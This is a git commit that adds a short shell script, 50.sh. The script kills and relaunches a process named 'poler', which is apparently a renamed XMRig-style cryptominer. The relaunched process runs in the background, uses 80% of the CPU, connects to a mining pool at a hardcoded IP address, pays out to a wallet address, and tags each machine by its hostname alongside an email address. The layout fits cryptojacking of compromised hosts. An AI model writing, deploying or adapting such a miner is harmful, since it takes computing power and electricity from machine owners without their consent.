905f778476b239a1748920f6eb8d51e06b7c1f3b
WilliamWizard <41175651+WilliamWizard@users.noreply.github.com>
2019-04-12 18:32:04 +0300

    from poler of hay

---
+++ 50.sh
@@ -0,0 +1,3 @@
+pkill poler
+sleep 7
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 80 --cpu-priority 3 -o 185.251.39.216:5987 -u 4297XE2wiBecRU6hp7j6mwE6t7TmCF7eEMpyDvWLQS7n2a5S7ahcZMVPbitLS3tzySXJwgGcGyP4U8bpAHjECBf6BvscfPi --pass="$(hostname)":nikolajzarkov770@gmail.com -k
